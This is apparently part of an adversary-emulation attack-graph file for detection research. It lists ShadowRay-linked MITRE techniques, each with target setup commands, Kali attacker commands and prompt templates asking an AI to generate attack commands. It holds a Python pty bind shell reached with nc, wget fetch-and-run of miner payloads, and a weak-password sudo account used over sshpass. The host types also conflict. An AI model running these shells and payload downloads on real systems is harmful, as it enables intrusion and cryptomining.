command(s) executed from Kali Linux that reproduce the behavioral characteristics of the technique.\n\n2) TARGET_VULNERABILITY:\n   A realistic vulnerability or misconfiguration that must exist on Host A or Host B to enable the attack behavior.\n   If placed on Host B, access must logically occur via Host A.\n\nBehavioral Requirements:\n- Preserve strict fidelity to the MITRE ATT&CK technique behavior.\n- Maintain realistic adversary tradecraft.\n- Commands must be technically valid on Kali Linux.\n- Assume Host A and Host B run default Debian 13 unless otherwise specified.\n- Do not assume additional non-default tools on the target unless explicitly stated.\n\nTelemetry Awareness Requirements:\n- The attack must generate observable system artifacts consistent with real-world adversary activity.\n- Do not intentionally suppress logging unless the MITRE technique explicitly involves defense evasion.\n- Prefer behaviors that naturally produce process execution, network connections, authentication events, file access, or service interaction telemetry.\n- The objective includes enabling measurable telemetry collection for detection evaluation.\n\nOutput strictly in this format:\n\nATTACKER_COMMAND:\n<command(s)>\n\nTARGET_VULNERABILITY:\n<description>\n\n================================================================================\n\nTECHNIQUE: T1546.004 - Unix Shell Configuration Modification\nTACTIC: privilege-escalation\nCAMPAIGN CONTEXT: During ShadowRay, threat actors executed commands on interactive and reverse shells.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. \nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session. \nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.\n\nFor this MITRE ATT&CK technique, generate TWO sets of commands:\n\n1) ENVIRONMENT_SETUP_COMMANDS:\n   Commands to run on the TARGET system to create the vulnerability/misconfiguration\n   that enables this technique. These prepare the environment for the attack.\n   \n   Output each command as:\n   SETUP_CMD: <command to run on target>\n   SETUP_DESC: <brief description>\n\n2) ATTACKER_COMMANDS:\n   Shell command(s) executed from Kali Linux that exploit the prepared environment\n   and reproduce the behavioral characteristics of the technique.\n   \n   Output each command as:\n   ATTACK_CMD: <command to run from Kali>\n   ATTACK_DESC: <brief description>\n\nOutput strictly in this format:\n\nENVIRONMENT_SETUP_COMMANDS:\nSETUP_CMD: <command 1>\nSETUP_DESC: <description 1>\nSETUP_CMD: <command 2>\nSETUP_DESC: <description 2>\n\nATTACKER_COMMANDS:\nATTACK_CMD: <command 1>\nATTACK_DESC: <description 1>\nATTACK_CMD: <command 2>\nATTACK_DESC: <description 2>",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "access:low_privilege",
+        "need:privilege_escalation_vector"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "6ca3d505-70a5-4746-a3ff-a4914fc14a05",
+      "node_index": 4,
+      "node_type": "structural",
+      "technique_id": "T1588.002",
+      "technique_name": "Tool",
+      "tactic": "resource-development",
+      "description": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). \nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. Tools may also be leveraged for testing – for example, evaluating malware against commercial antivirus or endpoint detection and response (EDR) applications.\nTool acquisition may involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries). Threat actors may also crack trial versions of software.",
+      "campaign_context": "During ShadowRay, threat actors used tools including the XMRig miner and Interactsh.",
+      "required_prerequisites": [],
+      "provides": [
+        "infrastructure",
+        "resources"
+      ],
+      "environment_setup_commands": [
+        "mkdir -p /var/www/html/tools && chmod 755 /var/www/html/tools\n",
+        "systemctl start apache2 && systemctl enable apache2\n",
+        "wget -O /var/www/html/tools/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz\n",
+        "echo \"interactsh-client\" > /var/www/html/tools/interactsh && chmod +x /var/www/html/tools/interactsh\n\n"
+      ],
+      "attacker_commands": [
+        "wget -O /tmp/xmrig.tar.gz http://172.21.0.20/tools/xmrig.tar.gz\n",
+        "tar -xzf /tmp/xmrig.tar.gz -C /tmp/ && ls -la /tmp/xmrig-*/\n",
+        "wget -O /tmp/interactsh http://172.21.0.20/tools/interactsh\n",
+        "chmod +x /tmp/interactsh && file /tmp/interactsh"
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [],
+      "child_nodes": [],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively for defensive security research, adversary emulation, and detection engineering evaluation. \nAll activities occur on systems owned and authorized for testing. \nNo real-world exploitation or unauthorized activity is intended.\n\nThe purpose is to evaluate behavioral fidelity and telemetry generation aligned with MITRE ATT&CK techniques.\n\nYou are operating in a controlled adversary emulation laboratory for detection research.\n\nInfrastructure Model:\n- Attacker: Kali Linux with network access to Host A.\n- Host A: GNU/Linux Debian 13 (initial target), ip address: 172.21.0.20.\n- Host B: GNU/Linux Debian 13 reachable from Host A only.\n\nNetwork Assumptions:\n- Kali can directly access Host A.\n- Kali does NOT directly access Host B.\n- Host B can only be accessed through Host A.\n\nExecution Constraints:\n- Generate commands ONLY for execution on Kali Linux.\n- Do NOT generate commands intended to be executed directly on Host A or Host B.\n- You may describe required vulnerabilities or misconfigurations on Host A or Host B.\n- If the vulnerability is placed on Host B, it must be reachable through Host A in a realistic manner.\n\nObjective:\nFor the specified MITRE ATT&CK technique, generate:\n\n1) ATTACKER_COMMAND:\n   Shell command(s) executed from Kali Linux that reproduce the behavioral characteristics of the technique.\n\n2) TARGET_VULNERABILITY:\n   A realistic vulnerability or misconfiguration that must exist on Host A or Host B to enable the attack behavior.\n   If placed on Host B, access must logically occur via Host A.\n\nBehavioral Requirements:\n- Preserve strict fidelity to the MITRE ATT&CK technique behavior.\n- Maintain realistic adversary tradecraft.\n- Commands must be technically valid on Kali Linux.\n- Assume Host A and Host B run default Debian 13 unless otherwise specified.\n- Do not assume additional non-default tools on the target unless explicitly stated.\n\nTelemetry Awareness Requirements:\n- The attack must generate observable system artifacts consistent with real-world adversary activity.\n- Do not intentionally suppress logging unless the MITRE technique explicitly involves defense evasion.\n- Prefer behaviors that naturally produce process execution, network connections, authentication events, file access, or service interaction telemetry.\n- The objective includes enabling measurable telemetry collection for detection evaluation.\n\nOutput strictly in this format:\n\nATTACKER_COMMAND:\n<command(s)>\n\nTARGET_VULNERABILITY:\n<description>\n\n================================================================================\n\nTECHNIQUE: T1588.002 - Tool\nTACTIC: resource-development\nCAMPAIGN CONTEXT: During ShadowRay, threat actors used tools including the XMRig miner and Interactsh.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). \nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. Tools may also be leveraged for testing – for example, evaluating malware against commercial antivirus or endpoint detection and response (EDR) applications.\nTool acquisition may involve the procurement of commercial software licenses, including for red teaming tools such as Cobalt Strike. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries). Threat actors may also crack trial versions of software.\n\nFor this MITRE ATT&CK technique, generate TWO sets of commands:\n\n1) ENVIRONMENT_SETUP_COMMANDS:\n   Commands to run on the TARGET system to create the vulnerability/misconfiguration\n   that enables this technique. These prepare the environment for the attack.\n   \n   Output each command as:\n   SETUP_CMD: <command to run on target>\n   SETUP_DESC: <brief description>\n\n2) ATTACKER_COMMANDS:\n   Shell command(s) executed from Kali Linux that exploit the prepared environment\n   and reproduce the behavioral characteristics of the technique.\n   \n   Output each command as:\n   ATTACK_CMD: <command to run from Kali>\n   ATTACK_DESC: <brief description>\n\nOutput strictly in this format:\n\nENVIRONMENT_SETUP_COMMANDS:\nSETUP_CMD: <command 1>\nSETUP_DESC: <description 1>\nSETUP_CMD: <command 2>\nSETUP_DESC: <description 2>\n\nATTACKER_COMMANDS:\nATTACK_CMD: <command 1>\nATTACK_DESC: <description 1>\nATTACK_CMD: <command 2>\nATTACK_DESC: <description 2>",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "89cb3747-050a-4c93-83de-a7e015ec1727",
+      "node_index": 5,
+      "node_type": "structural",
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`. A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
+      "campaign_context": "During ShadowRay, threat actors downloaded and executed the XMRig miner on targeted hosts.",
+      "required_prerequisites": [
+        "network:egress_allowed",
+        "access:initial"
+      ],
+      "provides": [
+        "c2_channel"
+      ],
+      "environment_setup_commands": [
+        "sudo apt update && sudo apt install -y apache2\n",
+        "sudo systemctl start apache2 && sudo systemctl enable apache2\n",
+        "echo '#!/bin/bash\\necho \"XMRig Miner Simulation\"\\necho \"Mining process started on $(hostname)\"\\nsleep 30\\necho \"Mining process completed\"' | sudo tee /var/www/html/xmrig_miner.sh\n",
+        "sudo chmod +x /var/www/html/xmrig_miner.sh\n",
+        "echo '{\"version\": \"1.0\", \"miner\": \"xmrig\", \"config\": \"mining_pool_config\"}' | sudo tee /var/www/html/config.json\n\n"
+      ],
+      "attacker_commands": [
+        "wget -O /tmp/xmrig_miner.sh http://172.21.0.20/xmrig_miner.sh\n",
+        "curl -s -o /tmp/config.json http://172.21.0.20/config.json\n",
+        "chmod +x /tmp/xmrig_miner.sh\n",
+        "/tmp/xmrig_miner.sh"
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Host A can initiate outbound connections (from pre-prompt)",
+      "parent_nodes": [
+        "149cdfe5-7159-405a-91b8-7a57c8765425"
+      ],
+      "child_nodes": [],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively for defensive security research, adversary emulation, and detection engineering evaluation. \nAll activities occur on systems owned and authorized for testing. \nNo real-world exploitation or unauthorized activity is intended.\n\nThe purpose is to evaluate behavioral fidelity and telemetry generation aligned with MITRE ATT&CK techniques.\n\nYou are operating in a controlled adversary emulation laboratory for detection research.\n\nInfrastructure Model:\n- Attacker: Kali Linux with network access to Host A.\n- Host A: GNU/Linux Debian 13 (initial target), ip address: 172.21.0.20.\n- Host B: GNU/Linux Debian 13 reachable from Host A only.\n\nNetwork Assumptions:\n- Kali can directly access Host A.\n- Kali does NOT directly access Host B.\n- Host B can only be accessed through Host A.\n\nExecution Constraints:\n- Generate commands ONLY for execution on Kali Linux.\n- Do NOT generate commands intended to be executed directly on Host A or Host B.\n- You may describe required vulnerabilities or misconfigurations on Host A or Host B.\n- If the vulnerability is placed on Host B, it must be reachable through Host A in a realistic manner.\n\nObjective:\nFor the specified MITRE ATT&CK technique, generate:\n\n1) ATTACKER_COMMAND:\n   Shell command(s) executed from Kali Linux that reproduce the behavioral characteristics of the technique.\n\n2) TARGET_VULNERABILITY:\n   A realistic vulnerability or misconfiguration that must exist on Host A or Host B to enable the attack behavior.\n   If placed on Host B, access must logically occur via Host A.\n\nBehavioral Requirements:\n- Preserve strict fidelity to the MITRE ATT&CK technique behavior.\n- Maintain realistic adversary tradecraft.\n- Commands must be technically valid on Kali Linux.\n- Assume Host A and Host B run default Debian 13 unless otherwise specified.\n- Do not assume additional non-default tools on the target unless explicitly stated.\n\nTelemetry Awareness Requirements:\n- The attack must generate observable system artifacts consistent with real-world adversary activity.\n- Do not intentionally suppress logging unless the MITRE technique explicitly involves defense evasion.\n- Prefer behaviors that naturally produce process execution, network connections, authentication events, file access, or service interaction telemetry.\n- The objective includes enabling measurable telemetry collection for detection evaluation.\n\nOutput strictly in this format:\n\nATTACKER_COMMAND:\n<command(s)>\n\nTARGET_VULNERABILITY:\n<description>\n\n================================================================================\n\nTECHNIQUE: T1105 - Ingress Tool Transfer\nTACTIC: command-and-control\nCAMPAIGN CONTEXT: During ShadowRay, threat actors downloaded and executed the XMRig miner on targeted hosts.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`. A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.\n\nFor this MITRE ATT&CK technique, generate TWO sets of commands:\n\n1) ENVIRONMENT_SETUP_COMMANDS:\n   Commands to run on the TARGET system to create the vulnerability/misconfiguration\n   that enables this technique. These prepare the environment for the attack.\n   \n   Output each command as:\n   SETUP_CMD: <command to run on target>\n   SETUP_DESC: <brief description>\n\n2) ATTACKER_COMMANDS:\n   Shell command(s) executed from Kali Linux that exploit the prepared environment\n   and reproduce the behavioral characteristics of the technique.\n   \n   Output each command as:\n   ATTACK_CMD: <command to run from Kali>\n   ATTACK_DESC: <brief description>\n\nOutput strictly in this format:\n\nENVIRONMENT_SETUP_COMMANDS:\nSETUP_CMD: <command 1>\nSETUP_DESC: <description 1>\nSETUP_CMD: <command 2>\nSETUP_DESC: <description 2>\n\nATTACKER_COMMANDS:\nATTACK_CMD: <command 1>\nATTACK_DESC: <description 1>\nATTACK_CMD: <command 2>\nATTACK_DESC: <description 2>",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "network:egress_allowed",
+        "access:initial"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "922d8454-e99c-42d9-b13c-b2c6d1e64edc",
+      "node_index": 6,
+      "node_type": "structural",
+      "technique_id": "T1059.006",
+      "technique_name": "Python",
+      "tactic": "execution",
+      "description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
+      "campaign_context": "During ShadowRay, threat actors used the Python `pty` module to open reverse shells.",
+      "required_prerequisites": [
+        "need:execution_vector",
+        "access:initial"
+      ],
+      "provides": [
+        "code_execution",
+        "execution_capability"
+      ],
+      "environment_setup_commands": [
+        "python3 -c \"import socket,subprocess,os,pty;s=socket.socket();s.bind(('172.21.0.20',4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);pty.spawn('/bin/bash')\"",
+        "nohup python3 -c \"import socket,subprocess,os,pty;s=socket.socket();s.bind(('172.21.0.20',4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);pty.spawn('/bin/bash')\" > /dev/null 2>&1 &\n\n"
+      ],
+      "attacker_commands": [
+        "nc 172.21.0.20 4444",
+        "echo \"import os; os.system('whoami')\" | python3 -c \"exec(input())\""
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [],
+      "child_nodes": [
+        "88830879-618f-498a-87a6-b879ad875d21",
+        "b35f71f1-c2e8-470d-8f64-e540f6004e52"
+      ],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively for defensive security research, adversary emulation, and detection engineering evaluation. \nAll activities occur on systems owned and authorized for testing. \nNo real-world exploitation or unauthorized activity is intended.\n\nThe purpose is to evaluate behavioral fidelity and telemetry generation aligned with MITRE ATT&CK techniques.\n\nYou are operating in a controlled adversary emulation laboratory for detection research.\n\nInfrastructure Model:\n- Attacker: Kali Linux with network access to Host A.\n- Host A: GNU/Linux Debian 13 (initial target), ip address: 172.21.0.20.\n- Host B: GNU/Linux Debian 13 reachable from Host A only.\n\nNetwork Assumptions:\n- Kali can directly access Host A.\n- Kali does NOT directly access Host B.\n- Host B can only be accessed through Host A.\n\nExecution Constraints:\n- Generate commands ONLY for execution on Kali Linux.\n- Do NOT generate commands intended to be executed directly on Host A or Host B.\n- You may describe required vulnerabilities or misconfigurations on Host A or Host B.\n- If the vulnerability is placed on Host B, it must be reachable through Host A in a realistic manner.\n\nObjective:\nFor the specified MITRE ATT&CK technique, generate:\n\n1) ATTACKER_COMMAND:\n   Shell command(s) executed from Kali Linux that reproduce the behavioral characteristics of the technique.\n\n2) TARGET_VULNERABILITY:\n   A realistic vulnerability or misconfiguration that must exist on Host A or Host B to enable the attack behavior.\n   If placed on Host B, access must logically occur via Host A.\n\nBehavioral Requirements:\n- Preserve strict fidelity to the MITRE ATT&CK technique behavior.\n- Maintain realistic adversary tradecraft.\n- Commands must be technically valid on Kali Linux.\n- Assume Host A and Host B run default Debian 13 unless otherwise specified.\n- Do not assume additional non-default tools on the target unless explicitly stated.\n\nTelemetry Awareness Requirements:\n- The attack must generate observable system artifacts consistent with real-world adversary activity.\n- Do not intentionally suppress logging unless the MITRE technique explicitly involves defense evasion.\n- Prefer behaviors that naturally produce process execution, network connections, authentication events, file access, or service interaction telemetry.\n- The objective includes enabling measurable telemetry collection for detection evaluation.\n\nOutput strictly in this format:\n\nATTACKER_COMMAND:\n<command(s)>\n\nTARGET_VULNERABILITY:\n<description>\n\n================================================================================\n\nTECHNIQUE: T1059.006 - Python\nTACTIC: execution\nCAMPAIGN CONTEXT: During ShadowRay, threat actors used the Python `pty` module to open reverse shells.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.\n\nFor this MITRE ATT&CK technique, generate TWO sets of commands:\n\n1) ENVIRONMENT_SETUP_COMMANDS:\n   Commands to run on the TARGET system to create the vulnerability/misconfiguration\n   that enables this technique. These prepare the environment for the attack.\n   \n   Output each command as:\n   SETUP_CMD: <command to run on target>\n   SETUP_DESC: <brief description>\n\n2) ATTACKER_COMMANDS:\n   Shell command(s) executed from Kali Linux that exploit the prepared environment\n   and reproduce the behavioral characteristics of the technique.\n   \n   Output each command as:\n   ATTACK_CMD: <command to run from Kali>\n   ATTACK_DESC: <brief description>\n\nOutput strictly in this format:\n\nENVIRONMENT_SETUP_COMMANDS:\nSETUP_CMD: <command 1>\nSETUP_DESC: <description 1>\nSETUP_CMD: <command 2>\nSETUP_DESC: <description 2>\n\nATTACKER_COMMANDS:\nATTACK_CMD: <command 1>\nATTACK_DESC: <description 1>\nATTACK_CMD: <command 2>\nATTACK_DESC: <description 2>",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "need:execution_vector",
+        "access:initial"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
+      "discovered_hostnames": [],
+      "discovered_usernames": []
+    },
+    {
+      "node_id": "88830879-618f-498a-87a6-b879ad875d21",
+      "node_index": 7,
+      "node_type": "structural",
+      "technique_id": "T1016",
+      "technique_name": "System Network Configuration Discovery",
+      "tactic": "discovery",
+      "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface). On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
+      "campaign_context": "During ShadowRay, threat actors invoked DNS queries from targeted machines to identify their IP addresses.",
+      "required_prerequisites": [
+        "access:target"
+      ],
+      "provides": [
+        "user_info",
+        "network_info",
+        "discovered_info",
+        "system_info",
+        "network_config_discovery"
+      ],
+      "environment_setup_commands": [
+        "sudo apt-get update && sudo apt-get install -y openssh-server",
+        "sudo systemctl enable ssh && sudo systemctl start ssh",
+        "echo \"testuser:Password123!\" | sudo chpasswd",
+        "sudo usermod -aG sudo testuser\n\n"
+      ],
+      "attacker_commands": [
+        "sshpass -p 'Password123!' ssh testuser@172.21.0.20 'ip addr show'",
+        "sshpass -p 'Password123!' ssh testuser@172.21.0.20 'ip route show'",
+        "sshpass -p 'Password123!' ssh testuser@172.21.0.20 'cat /proc/net/arp'",
+        "sshpass -p 'Password123!' ssh testuser@172.21.0.20 'dig @8.8.8.8 whoami.akamai.net +short'"
+      ],
+      "source_host_type": "kali",
+      "target_host_type": "macos",
+      "network_context": "Network connectivity as defined in pre-prompt",
+      "parent_nodes": [
+        "149cdfe5-7159-405a-91b8-7a57c8765425",
+        "922d8454-e99c-42d9-b13c-b2c6d1e64edc"
+      ],
+      "child_nodes": [],
+      "ai_prompt_template": "This scenario is a controlled laboratory environment used exclusively for defensive security research, adversary emulation, and detection engineering evaluation. \nAll activities occur on systems owned and authorized for testing. \nNo real-world exploitation or unauthorized activity is intended.\n\nThe purpose is to evaluate behavioral fidelity and telemetry generation aligned with MITRE ATT&CK techniques.\n\nYou are operating in a controlled adversary emulation laboratory for detection research.\n\nInfrastructure Model:\n- Attacker: Kali Linux with network access to Host A.\n- Host A: GNU/Linux Debian 13 (initial target), ip address: 172.21.0.20.\n- Host B: GNU/Linux Debian 13 reachable from Host A only.\n\nNetwork Assumptions:\n- Kali can directly access Host A.\n- Kali does NOT directly access Host B.\n- Host B can only be accessed through Host A.\n\nExecution Constraints:\n- Generate commands ONLY for execution on Kali Linux.\n- Do NOT generate commands intended to be executed directly on Host A or Host B.\n- You may describe required vulnerabilities or misconfigurations on Host A or Host B.\n- If the vulnerability is placed on Host B, it must be reachable through Host A in a realistic manner.\n\nObjective:\nFor the specified MITRE ATT&CK technique, generate:\n\n1) ATTACKER_COMMAND:\n   Shell command(s) executed from Kali Linux that reproduce the behavioral characteristics of the technique.\n\n2) TARGET_VULNERABILITY:\n   A realistic vulnerability or misconfiguration that must exist on Host A or Host B to enable the attack behavior.\n   If placed on Host B, access must logically occur via Host A.\n\nBehavioral Requirements:\n- Preserve strict fidelity to the MITRE ATT&CK technique behavior.\n- Maintain realistic adversary tradecraft.\n- Commands must be technically valid on Kali Linux.\n- Assume Host A and Host B run default Debian 13 unless otherwise specified.\n- Do not assume additional non-default tools on the target unless explicitly stated.\n\nTelemetry Awareness Requirements:\n- The attack must generate observable system artifacts consistent with real-world adversary activity.\n- Do not intentionally suppress logging unless the MITRE technique explicitly involves defense evasion.\n- Prefer behaviors that naturally produce process execution, network connections, authentication events, file access, or service interaction telemetry.\n- The objective includes enabling measurable telemetry collection for detection evaluation.\n\nOutput strictly in this format:\n\nATTACKER_COMMAND:\n<command(s)>\n\nTARGET_VULNERABILITY:\n<description>\n\n================================================================================\n\nTECHNIQUE: T1016 - System Network Configuration Discovery\nTACTIC: discovery\nCAMPAIGN CONTEXT: During ShadowRay, threat actors invoked DNS queries from targeted machines to identify their IP addresses.\n\nTECHNIQUE DESCRIPTION:\nAdversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface). On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.\n\nFor this MITRE ATT&CK technique, generate TWO sets of commands:\n\n1) ENVIRONMENT_SETUP_COMMANDS:\n   Commands to run on the TARGET system to create the vulnerability/misconfiguration\n   that enables this technique. These prepare the environment for the attack.\n   \n   Output each command as:\n   SETUP_CMD: <command to run on target>\n   SETUP_DESC: <brief description>\n\n2) ATTACKER_COMMANDS:\n   Shell command(s) executed from Kali Linux that exploit the prepared environment\n   and reproduce the behavioral characteristics of the technique.\n   \n   Output each command as:\n   ATTACK_CMD: <command to run from Kali>\n   ATTACK_DESC: <brief description>\n\nOutput strictly in this format:\n\nENVIRONMENT_SETUP_COMMANDS:\nSETUP_CMD: <command 1>\nSETUP_DESC: <description 1>\nSETUP_CMD: <command 2>\nSETUP_DESC: <description 2>\n\nATTACKER_COMMANDS:\nATTACK_CMD: <command 1>\nATTACK_DESC: <description 1>\nATTACK_CMD: <command 2>\nATTACK_DESC: <description 2>",
+      "validation_rules": [
+        "Command must execute without errors",
+        "Expected artifacts must be generated",
+        "Telemetry must be captured",
+        "No unintended system modifications"
+      ],
+      "cleanup_template": "No cleanup required",
+      "satisfied_prerequisites": [],
+      "unsatisfied_prerequisites": [
+        "access:target"
+      ],
+      "executed": false,
+      "execution_result": null,
+      "executor": null,
+      "discovered_ips": [],
